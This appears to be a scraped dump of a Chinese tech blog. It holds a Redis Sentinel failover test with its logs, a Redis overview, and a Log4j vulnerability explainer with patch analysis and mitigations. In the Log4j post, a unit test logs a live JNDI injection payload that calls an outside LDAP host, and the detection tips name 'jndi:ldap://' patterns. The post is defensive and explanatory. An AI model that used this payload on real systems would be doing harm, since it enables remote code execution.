java.util.Date;import java.util.HashSet;import java.util.Set;public class RedisSentinelTest &#123; static RedisSentinelTest test = new RedisSentinelTest(); public static void main(String[] args) throws Exception &#123; test1(); &#125; public static void test1() throws IOException &#123; File file = new File(&quot;/Users/wuhao/redis/redis-log&quot;); if (file.exists())&#123; file.delete(); &#125; file.createNewFile(); FileOutputStream fileOutputStream = new FileOutputStream(file); JedisPoolConfig poolConfig = new JedisPoolConfig(); String masterName = &quot;mymaster&quot;; Set&lt;String&gt; sentinels = new HashSet&lt;String&gt;(); sentinels.add(&quot;10.10.220.149:17021&quot;); sentinels.add(&quot;10.10.220.149:17022&quot;); sentinels.add(&quot;10.10.220.149:17023&quot;); JedisSentinelPool jedisSentinelPool = new JedisSentinelPool(masterName, sentinels, poolConfig); for (int i = 0; i &lt; 20; i++) &#123; Thread run = new Thread(new Runnable() &#123; @Override public void run() &#123; while (true)&#123; Jedis redisJ = null; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; try &#123; redisJ = jedisSentinelPool.getResource(); redisJ.set(&quot;a&quot;, &quot;333&quot;); String value = redisJ.get(&quot;a&quot;); HostAndPort currentHostMaster = jedisSentinelPool.getCurrentHostMaster(); String host = new Date() + &quot;OK-&quot;+ currentHostMaster.toString() + &quot;\\n&quot;; fileOutputStream.write(host.getBytes()); &#125; catch (Exception e)&#123; e.printStackTrace(); try &#123; fileOutputStream.write( (&quot;ERROR-&quot; + e.getMessage()).getBytes()); fileOutputStream.write(&quot;\\n&quot;.getBytes()); &#125; catch (IOException e1) &#123; e1.printStackTrace(); &#125; &#125; finally &#123; if (redisJ != null)&#123; redisJ.close(); &#125; &#125; &#125; &#125; &#125;); run.start();; &#125; try &#123; Thread.sleep(1000000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 3.2 结果输出123456789101112131415161718192021222324252627282930313233343536373839sentinel down-after-milliseconds mymaster 5000业务恢复正常为7秒左右Fri May 04 11:38:10 CST 2018OK-10.10.220.149:7021Fri May 04 11:38:10 CST 2018OK-10.10.220.149:7021ERROR-It seems like server has closed the connection.ERROR-It seems like server has closed the connection.ERROR-It seems like server has closed the connection.ERROR-It seems like server has closed the connection.ERROR-It seems like server has closed the connection.ERROR-Could not get a resource from the poolERROR-Could not get a resource from the poolFri May 04 11:38:17 CST 2018OK-10.10.220.149:7022Fri May 04 11:38:17 CST 2018OK-10.10.220.149:7022Fri May 04 11:38:17 CST 2018OK-10.10.220.149:7022Fri May 04 11:38:17 CST 2018OK-10.10.220.149:7022Fri May 04 11:38:17 CST 2018OK-10.10.220.149:7022sentinel down-after-milliseconds mymaster 1000业务恢复正常为3秒左右Fri May 04 12:05:38 CST 2018OK-10.10.220.149:7021Fri May 04 12:05:38 CST 2018OK-10.10.220.149:7021Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-Could not get a resource from the poolFri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-It seems like server has closed the connection.Fri May 04 12:05:39 CST 2018ERROR-Could not get a resource from the poolFri May 04 12:05:39 CST 2018ERROR-Could not get a resource from the poolFri May 04 12:05:39 CST 2018ERROR-Could not get a resource from the poolFri May 04 12:05:39 CST 2018ERROR-Could not get a resource from the poolFri May 04 12:05:40 CST 2018ERROR-Could not get a resource from the poolFri May 04 12:05:41 CST 2018OK-10.10.220.149:7022Fri May 04 12:05:41 CST 2018OK-10.10.220.149:7022Fri May 04 12:05:41 CST 2018OK-10.10.220.149:7022","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"Redis原理与使用","slug":"data/redis/Redis原理与使用","date":"2022-04-07T01:21:38.753Z","updated":"2022-04-07T01:21:38.753Z","comments":true,"path":"2022/04/07/data/redis/Redis原理与使用/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/Redis%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1.原理介绍（1）什么是 redis?Redis 是一个基于内存的高性能key-value数据库。 (有空再补充，有理解错误或不足欢迎指正) （2）Reids 的特点Redis本质上是一个Key-Value类型的内存数据库，很像memcached，整个数据库统统加载在内存当中进行操作， 定期通过异步操作把数据库数据flush到硬盘上进行保存。 Redis的性能非常出色，每秒可以处理超过 10万次读写操作，是已知性能最快的Key-Value DB。 Redis最大的魅力是支持保存多种数据结构，此外单个value的最大限制是1GB，不像 memcached只能保存1MB的数据， 因此Redis可以用来实现很多有用的功能，比方说用他的List来做FIFO双向链表，实现一个轻量级的高性 能消息队列服务， 用他的Set可以做高性能的tag系统等等。另外Redis也可以对存入的Key-Value设置expire时间，因此也可以被当作一 个功能加强版的memcached来用。 Redis的主要缺点是数据库容量受到物理内存的限制，不能用作海量数据的高性能读写，因此Redis适合的场景主要局限在较小数据量的高性能操作和运算上。 （3）Redis 支持的数据类型Redis通过Key-Value的单值不同类型来区分, 以下是支持的类型: Strings Lists Sets 求交集、并集 Sorted Set hashes #####（4）为什么 redis 需要把所有数据放到内存中？Redis 为了达到最快的读写速度将数据都读到内存中，并通过异步的方式将数据写入磁盘。所以 redis 具有快速和数据持久化的特征。如果不将数据放在内存中，磁盘 I/O 速度为严重影响 redis 的性能。在内存越来越便宜的今天，redis 将会越来越受欢迎。如果设置了最大使用的内存，则数据已有记录数达到内存限值后不能继续插入新值。 #####（5）Redis 是单进程单线程的redis 利用队列技术将并发访问变为串行访问，消除了传统数据库串行控制的开销 #####（6）虚拟内存当你的 key 很小而 value 很大时,使用 VM 的效果会比较好.因为这样节约的内存比较大.当你的 key 不小时,可以考虑使用一些非常方法将很大的 key 变成很大的 value,比如你可以考虑将 key,value 组合成一个新的 value.vm-max-threads 这个参数,可以设置访问 swap 文件的线程数,设置最好不要超过机器的核数,如果设置为 0,那么所有对 swap 文件的操作都是串行的.可能会造成比较长时间的延迟,但是对数据完整性有很好的保证. 自己测试的时候发现用虚拟内存性能也不错。如果数据量很大，可以考虑分布式或者其他数据库 #####（7）分布式redis 支持主从的模式。原则：Master 会将数据同步到 slave，而 slave 不会将数据同步到 master。Slave 启动时会连接 master 来同步数据。这是一个典型的分布式读写分离模型。我们可以利用 master 来插入数据，slave 提供检索服务。这样可以有效减少单个机器的并发访问数据 #####（8）读写分离模型通过增加 Slave DB 的数量，读的性能可以线性增长。为了避免 Master DB 的单点故障，集群一般都会采用两台 Master DB 做双机热备，所以整个集群的读和写的可用性都非常高。读写分离架构的缺陷在于，不管是 Master 还是 Slave，每个节点都必须保存完整的数据，如果在数据量很大的情况下，集群的扩展能力还是受限于单个节点的存储能力，而且对于 Write-intensive 类型的应用，读写分离架构并不适合。 #####（9）数据分片模型 为了解决读写分离模型的缺陷，可以将数据分片模型应用进来。 可以将每个节点看成都是独立的master，然后通过业务实现数据分片。 结合上面两种模型，可以将每个master设计成由一个master和多个slave组成的模型。 （10）Redis 的回收策略volatile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰 volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰 volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰 allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰 allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰 no-enviction（驱逐）：禁止驱逐数据 1. 使用 Redis 有哪些好处？(1) 速度快，因为数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1) (2) 支持丰富数据类型，支持string，list，set，sorted set，hash (3) 支持事务，操作都是原子性，所谓的原子性就是对数据的更改要么全部执行，要么全部不执行 (4) 丰富的特性：可用于缓存，消息，按key设置过期时间，过期后将会自动删除 2. redis 相比 memcached 有哪些优势？(1) memcached所有的值均是简单的字符串，redis作为其替代者，支持更为丰富的数据类型 (2) redis的速度比memcached快很多 (3) redis可以持久化其数据 3. redis 常见性能问题和解决方案：(1) Master最好不要做任何持久化工作，如RDB内存快照和AOF日志文件 (2) 如果数据比较重要，某个Slave开启AOF备份数据，策略设置为每秒同步一次 (3) 为了主从复制的速度和连接的稳定性，Master和Slave最好在同一个局域网内 (4) 尽量避免在压力很大的主库上增加从库 (5) 主从复制不要用图状结构，用单向链表结构更为稳定，即：Master &lt;- Slave1 &lt;- Slave2 &lt;- Slave3... 这样的结构方便解决单点故障问题，实现Slave对Master的替换。如果Master挂了，可以立刻启用Slave1做Master，其他不变。 4. MySQL 里有 2000w 数据，redis 中只存 20w 的数据，如何保证 redis 中的数据都是热点数据相关知识：redis 内存数据集大小上升到一定大小的时候，就会施行数据淘汰策略。redis 提供 6种数据淘汰策略： voltile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰 volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰 volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰 allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰 allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰 no-enviction（驱逐）：禁止驱逐数据 5. Memcache 与 Redis 的区别都有哪些？1)、存储方式 Memecache把数据全部存在内存之中，断电后会挂掉，数据不能超过内存大小。 Redis有部份存在硬盘上，这样能保证数据的持久性。 2)、数据支持类型 Memcache对数据类型支持相对简单。 Redis有复杂的数据类型。 3)、使用底层模型不同 它们之间底层实现方式 以及与客户端之间通信的应用协议不一样。 Redis直接自己构建了VM 机制 ，因为一般的系统调用系统函数的话，会浪费一定的时间去移动和请求。 4），value大小 redis最大可以达到1GB，而memcache只有1MB 6. Redis 常见的性能问题都有哪些？如何解决？1).Master写内存快照，save命令调度rdbSave函数，会阻塞主线程的工作，当快照比较大时对性能影响是非常大的，会间断性暂停服务，所以Master最好不要写内存快照。 2).Master AOF持久化，如果不重写AOF文件，这个持久化方式对性能的影响是最小的，但是AOF文件会不断增大，AOF文件过大会影响Master重启的恢复速度。Master最好不要做任何持久化工作，包括内存快照和AOF日志文件，特别是不要启用内存快照做持久化,如果数据比较关键，某个Slave开启AOF备份数据，策略为每秒同步一次。 3).Master调用BGREWRITEAOF重写AOF文件，AOF在重写的时候会占大量的CPU和内存资源，导致服务load过高，出现短暂服务暂停现象。 4). Redis主从复制的性能问题，为了主从复制的速度和连接的稳定性，Slave和Master最好在同一个局域网内 7.redis 最适合的场景Redis最适合所有数据in-momory的场景，虽然Redis也提供持久化功能，但实际更多的是一个disk-backed的功能，跟传统意义上的持久化有比较大的差别， 那么可能大家就会有疑问，似乎Redis更像一个加强版的Memcached，那么何时使用Memcached,何时使用Redis呢? 如果简单地比较Redis与Memcached的区别，大多数都会得到以下观点： 1 、Redis不仅仅支持简单的k/v类型的数据，同时还提供list，set，zset，hash等数据结构的存储。 2 、Redis支持数据的备份，即master-slave模式的数据备份。 3 、Redis支持数据的持久化，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用。 （1）会话缓存（Session Cache） 最常用的一种使用Redis的情景是会话缓存（session cache）。用Redis缓存会话比其他存储（如Memcached）的优势在于：Redis提供持久化 。当维护一个不是严格要求一致性的缓存时，如果用户的购物车信息全部丢失，大部分人都会不高兴的，现在，他们还会这样吗？ 幸运的是，随着 Redis 这些年的改进，很容易找到怎么恰当的使用Redis来缓存会话的文档。甚至广为人知的商业平台Magento也提供Redis的插件。 （2）全页缓存（FPC） 除基本的会话token之外，Redis还提供很简便的FPC平台。回到一致性问题，即使重启了Redis实例，因为有磁盘的持久化， 用户也不会看到页面加载速度的下降，这是一个极大改进，类似PHP本地FPC。 再次以Magento为例，Magento提供一个插件来使用Redis作为全页缓存后端。 此外，对WordPress的用户来说，Pantheon有一个非常好的插件 wp-redis，这个插件能帮助你以最快速度加载你曾浏览过的页面。 （3）队列 Reids在内存存储引擎领域的一大优点是提供 list 和 set 操作，这使得Redis能作为一个很好的消息队列平台来使用。Redis作为队列使用的操作， 就类似于本地程序语言（如Python）对 list 的 push/pop 操作。 如果你快速的在Google中搜索“Redis queues”，你马上就能找到大量的开源项目，这些项目的目的就是利用Redis创建非常好的后端工具，以满足各种队列需求。 例如，Celery有一个后台就是使用Redis作为broker，你可以从这里去查看。 （4）排行榜/计数器 Redis在内存中对数字进行递增或递减的操作实现的非常好。集合（Set）和有序集合（Sorted Set）也使得我们在执行这些操作的时候变的非常简单， Redis只是正好提供了这两种数据结构。所以，我们要从排序集合中获取到排名最靠前的10个用户–我们称之为“user_scores”，我们只需要像下面一样执行即可： 当然，这是假定你是根据你用户的分数做递增的排序。如果你想返回用户及用户的分数，你需要这样执行： ZRANGE user_scores 0 10 WITHSCORES Agora Games就是一个很好的例子，用Ruby实现的，它的排行榜就是使用Redis来存储数据的，你可以在这里看到。 （5）、发布/订阅 最后（但肯定不是最不重要的）是Redis的发布/订阅功能。发布/订阅的使用场景确实非常多。我已看见人们在社交网络连接中使用， 还可作为基于发布/订阅的脚本触发器，甚至用Redis的发布/订阅功能来建立聊天系统！（不，这是真的，你可以去核实）。 Redis提供的所有特性中，我感觉这个是喜欢的人最少的一个，虽然它为用户提供如果此多功能。 8.实例使用redis计数器防止并发请求 需求描述 最近项目中有个需求，短信发送的并发请求问题：业务需求是需要限制一个号码一分钟内只能获取一次随机码，之前的实现是短信发送请求过来后， 先去数据库查询发送记录，根据上一次的短信发送时间和当前时间比较，如果时间差小于一分钟，则提示短信获取频繁，如果超过一分钟，则发送短信，并记录短信发送日志。 问题分析 短信发送是一个很敏感的业务，上面的实现存在一个并发请求的问题，当同一时间有很多请求过来时，同时去查库，同时获取到上一次发送时间没有， 或者已超过一分钟，这时候就会重复发送短信了。 使用Redis incr解决问题 Redis incr 可以实现原子性的递增，可应用于高并发的秒杀活动、分布式序列号生成等场景。这里我使用它来计数实现一分钟内只接受一次请求。 实现逻辑也很简单：我们在接到短信发送请求后，使用Redis的incr设置一个递增KEY（KEY由固定字符串+手机号码组成），并判断该KEY的数值， 如果等于1，说明是第一个请求，我们将该KEY值有效期设置为一分钟；如果该KEY的数值大于1，说明是1分钟内的多次请求，这时我们直接返回短信获取频繁 参考：https://blog.csdn.net/waeceo/article/details/78701397","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"log4j漏洞介绍及防护","slug":"language/java/log4j/log4j漏洞介绍及防护","date":"2021-12-17T07:59:58.675Z","updated":"2021-12-31T08:13:15.770Z","comments":true,"path":"2021/12/17/language/java/log4j/log4j漏洞介绍及防护/","link":"","permalink":"https://wuhaocn.github.io/2021/12/17/language/java/log4j/log4j%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%98%B2%E6%8A%A4/","excerpt":"","text":"CVE-2021-45105 CVE-2021-45046 CVE-2021-44832 CVE-2021-44228 1.概述 Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，被大量用于业务系统开发，用来记录日志信息。 CVE-2021-44228 远程控制漏洞（RCE）影响从 2.0-beta9 到 2.14.1 的 Log4j 版本。受影响的 Log4j 版本包含 Java 命名和目录接口 (JNDI) 功能， 可以执行如消息查找替换等操作，攻击者可以通过向易受攻击的系统提交特制的请求，从而完全控制系统，远程执行任意代码，然后进行窃取信息、启动勒索软件或其他恶意活动。Apache Log4j2 安全补丁更新过程 2021-12-27 发布版本 2.17.1 当前安全版本 2021-12-18 发布版本 2.17.0 直接漏洞(CVE-2021-44832) 2021-12-13 发布版本 2.16.0 直接漏洞(CVE-2021-45105 CVE-2021-44832) 2021-12-10 发布版本 2.15.0 直接漏洞(CVE-2021-45105 CVE-2021-45046 CVE-2021-44832) 2021-12-10 发布版本 2.14.1(严重漏洞) 直接漏洞(CVE-2021-45105 CVE-2021-45046 CVE-2021-44832 CVE-2021-44228) 2017-09-18 发布版本 2.9.1(严重漏洞) 直接漏洞(CVE-2021-45105 CVE-2021-45046 CVE-2021-44832 CVE-2021-44228)(无法通过缓解方案解决) 1.1 官方说明 CVE-2021-44228（Log4j2 初始漏洞） Apache Log4j 2 2.0-beta9 到 2.12.1 和 2.13.0 到 2.15.0 版本的 JNDI 功能在配置、日志消息和参数中使用，无法防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。从版本 2.16.0 开始，此功能已完全删除。请注意，此漏洞特定于 log4j-core，不会影响 log4net、log4cxx 或其他 Apache 日志服务项目。 CVE-2021-45046（Log4j 2.15.0 未完整修复的漏洞） Apache Log4j 2.15.0 中针对 CVE-2021-44228 的修复在某些非默认配置中不完整。当日志配置使用非默认模式布局和上下文查找（例如，$${ctx:loginId}）或线程上下文映射模式（ %X、%mdc 或 %MDC）使用 JNDI 查找模式制作恶意输入数据，从而导致拒绝服务 (DOS) 攻击。默认情况下，Log4j 2.15.0 尽最大努力将 JNDI LDAP 查找限制为 localhost。Log4j 2.16.0 通过删除对消息查找模式的支持和默认禁用 JNDI 功能来修复此问题。 CVE-2021-4104（Log4j 1.2 版本问题） 当攻击者对 Log4j 配置具有写访问权限时，Log4j 1.2 中的 JMSAppender 容易受到不可信数据的反序列化。攻击者可以提供 TopicBindingName 和 TopicConnectionFactoryBindingName 配置，导致 JMSAppender 以类似于 CVE-2021-44228 的方式执行 JNDI 请求，从而导致远程代码执行。注意， JMSAppender 不是 Log4j 的默认配置，因此此漏洞仅在特别配置为 JMSAppender 时才会影响 Log4j 1.2。事实上 Apache Log4j 1.2 已于 2015 年 8 月终止生命周期。用户应该升级到Log4j 2，因为它解决了以前版本的许多其他问题。​ 1.2 开源组织 已修复/更新： Metabase ：v0.41.4 发布，解决 log4j2 漏洞问题 openEuler：欧拉开源社区 Log4j 高危安全漏洞修复完成 KubeSphere：Apache Log4j 2 远程代码执行最新漏洞的修复方案 **MateCloud **：4.2.8 正式版发布，修复 Log4j2 的安全漏洞 **openLooKeng **开源社区： Apache Log4j2 高危安全漏洞修复完成 JPress 博客系统：发布新版，修复 Log4j 漏洞问题 Netty ：4.1.72.Final 发布，更新 Log4j2 版本 Apache NiFi ：1.5.1 紧急发布，修复 log4j2 相关问题 Jedis ：3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题 **Eurynome Cloud **： v2.6.2.10 发布，修复 Apache Log4j2 安全问题 Jedis： 3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题 **Apache Solr **：发布漏洞影响情况和缓解措施 Minecraft ：发布漏洞声明和缓解方案 Apache Flink ：关于 Apache Log4j 零日 (CVE-2021-44228) 的建议 Apache Druid：建议所有用户升级到 Druid 0.22.1 OpenSearch：重要提示：更新到 OpenSearch 1.2.1 OpenNMS：受 Apache Log4j 漏洞影响的 OpenNMS 产品 IBM Cúram ：可能会影响 Cúram Social Program IBM WebSphere：受影响，已更新 不受影响： Anolis OS：不受 Log4j 高危安全漏洞影响 **SUSE **：产品均不受影响 Apache Spark：不受影响 **Curl / Libcurl **：不受影响 **Zabbix **：不受影响 **DBeaver **：Log4j2 漏洞对我们的用户不危险 VideoLAN：核心已移植到 Kotlin ，不用 Log4j Cloudflare：Cloudflare 如何安全应对 Log4j 2 漏洞 LastPass：不受影响 HackerOne：不受影响，能利用漏洞影响 H1 的人可获得 25000 美金奖励 ​发布漏洞相关工具 360CERT：发布Log4j2恶意荷载批量检测调查工具 腾讯容器安全：发布开源 Log4j2 漏洞缓解工具 2.初始漏洞说明 影响范围Apache Log4j 2.x &lt;= 2.15.0-rc1受影响的应用及组件（包括但不限于）如下： Apache Solr、Apache Flink、Apache Druid、Apache Struts2、srping-boot-strater-log4j2等。 攻击检测可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。 3.检测代码 示例代码 12345678910111213141516171819202122232425public class Log4jErrorTest &#123; private static final Logger logger = LogManager.getLogger(Log4jErrorTest.class); @Test void testLog4jError() throws InterruptedException &#123; // -Dlog4j2.formatMsgNoLookups=true jvm参数修复 final boolean[] sign = &#123;false&#125;; Thread thread = new Thread(new Runnable() &#123; @Override public void run() &#123; logger.error(&quot;$&#123;jndi:ldap://192.168.1.20:1389/Basic/Command/calc&#125;&quot;); sign[0] = true; &#125; &#125;); thread.start(); try &#123; Thread.sleep(500); &#125; catch (Exception e)&#123; Assertions.assertEquals(true, sign[0]); &#125; Assertions.assertEquals(true, sign[0]); &#125;&#125; 4.修正策略 升级版本log版本123log4j_version=2.16.0log4j2.15版本未完全解决 添加jvm参数启动参数 log4j版本大于2.10才可用1234-Dlog4j2.formatMsgNoLookups=true//启动配置：log4j2.formatMsgNoLookups=True，不建议，不如升级版本//设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true 其他修正 12345禁止不必要的业务访问外网这个也不建议，影响业务线程阻塞采用 rasp 对lookup的调用进行阻断采用waf对请求流量中的$&#123;jndi进行拦截 5.漏洞片段5.1 漏洞堆栈1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&quot;main&quot; #1 prio=5 os_prio=31 tid=0x00007fc01e807000 nid=0x2703 runnable [0x000070000b944000] java.lang.Thread.State: RUNNABLE at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) - locked &lt;0x0000000796c8d0d0&gt; (a java.net.SocksSocketImpl) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:606) at java.net.Socket.connect(Socket.java:555) at java.net.Socket.&lt;init&gt;(Socket.java:451) at java.net.Socket.&lt;init&gt;(Socket.java:228) at com.sun.jndi.ldap.Connection.createSocket(Connection.java:375) at com.sun.jndi.ldap.Connection.&lt;init&gt;(Connection.java:215) at com.sun.jndi.ldap.LdapClient.&lt;init&gt;(LdapClient.java:137) at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1609) at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749) at com.sun.jndi.ldap.LdapCtx.&lt;init&gt;(LdapCtx.java:319) at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60) at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202) at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94) at javax.naming.InitialContext.lookup(InitialContext.java:417) at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172) at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56) at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221) at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110) at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033) at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912) at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467) at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132) at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38) at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344) at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244) at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229) at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59) at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197) at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190) at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181) at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156) at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129) at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120) at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84) at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540) at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498) at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481) at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456) at org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63) at org.apache.logging.log4j.core.Logger.log(Logger.java:161) at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205) at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159) at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142) at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017) at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983) at org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740) at log4jRCE.main(log4jRCE.java:16) 5.2 修正策略 以2.16.0为例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//jndi关闭策略public static boolean isJndiEnabled() &#123; return PropertiesUtil.getProperties().getBooleanProperty(&quot;log4j2.enableJndi&quot;, false);&#125;//关闭策略@Overridepublic JndiManager createManager(final String name, final Properties data) &#123; if (isJndiEnabled()) &#123; // 2021/12/13 修正 String hosts = data != null ? data.getProperty(ALLOWED_HOSTS) : null; String classes = data != null ? data.getProperty(ALLOWED_CLASSES) : null; String protocols = data != null ? data.getProperty(ALLOWED_PROTOCOLS) : null; List&lt;String&gt; allowedHosts = new ArrayList&lt;&gt;(); List&lt;String&gt; allowedClasses = new ArrayList&lt;&gt;(); List&lt;String&gt; allowedProtocols = new ArrayList&lt;&gt;(); addAll(hosts, allowedHosts, permanentAllowedHosts, ALLOWED_HOSTS, data); addAll(classes, allowedClasses, permanentAllowedClasses, ALLOWED_CLASSES, data); addAll(protocols, allowedProtocols, permanentAllowedProtocols, ALLOWED_PROTOCOLS, data); try &#123; return new JndiManager(name, new InitialDirContext(data), allowedHosts, allowedClasses, allowedProtocols); &#125; catch (final NamingException e) &#123; LOGGER.error(&quot;Error creating JNDI InitialContext.&quot;, e); return null; &#125; &#125; else &#123; return new JndiManager(name); &#125;&#125;@SuppressWarnings(&quot;unchecked&quot;)public synchronized &lt;T&gt; T lookup(final String name) throws NamingException &#123; if (context == null) &#123; //2021/12/12 修正 return null; &#125; try &#123; URI uri = new URI(name); ... &#125; catch (URISyntaxException ex) &#123; LOGGER.warn(&quot;Invalid JNDI URI - &#123;&#125;&quot;, name); return null; &#125; ...&#125;//2021/12/12private JndiManager(final String name) &#123; super(null, name); this.context = null; this.allowedProtocols = null; this.allowedClasses = null; this.allowedHosts = null;&#125;//2021/12/12 修正if (JndiManager.isJndiEnabled()) &#123; try &#123; return new JmsManager(name, data); &#125; catch (final Exception e) &#123; logger().error(&quot;Error creating JmsManager using JmsManagerConfiguration [&#123;&#125;]&quot;, data, e); return null; &#125;&#125; else &#123; logger().error(&quot;JNDI has not been enabled. The log4j2.enableJndi property must be set to true&quot;); return null;&#125;for (final Map.Entry&lt;String, PluginType&lt;?&gt;&gt; entry : plugins.entrySet()) &#123; try &#123; final Class&lt;? extends StrLookup&gt; clazz = entry.getValue().getPluginClass().asSubclass(StrLookup.class);//2021/12/13 修正 if (!clazz.getName().equals(JndiLookup.class.getName()) || JndiManager.isJndiEnabled()) &#123; strLookupMap.put(entry.getKey().toLowerCase(), ReflectionUtil.instantiate(clazz)); &#125; &#125; catch (final Throwable t) &#123; handleError(entry.getKey(), t); &#125;&#125;//2021/12/05修正MessagePatternConverter此版本主要为2.15版本修正内容 6.可能带来问题6.1.日志写入加大性能问题123456789101112● log4j压测业务服务 ○ 压测结论升级log4j 2.17.0 ○ 同步立即刷盘降低2-3倍，改为同步缓存刷盘有少许提升，改为异步较大提升 ○ 详细压测数据 ■ log4j-2.8 同 步: 3000/s ■ log4j-2.17.0 同 步: 1200/s ■ log4j-2.17.0 同步缓存: 1400/s ■ log4j-2.17.0 异步配置: 3300/s● 问题描述 ○ 升级log4j后续注意性能问题，写入日志量较多的话会有性能瓶颈，开了同步缓存会缓解一些，改为异步，比原来性能要高一些● 问题检查 ○ 检查一下业务线程是否有业务日志线程锁 6.2.spring升级不动 重写log构建 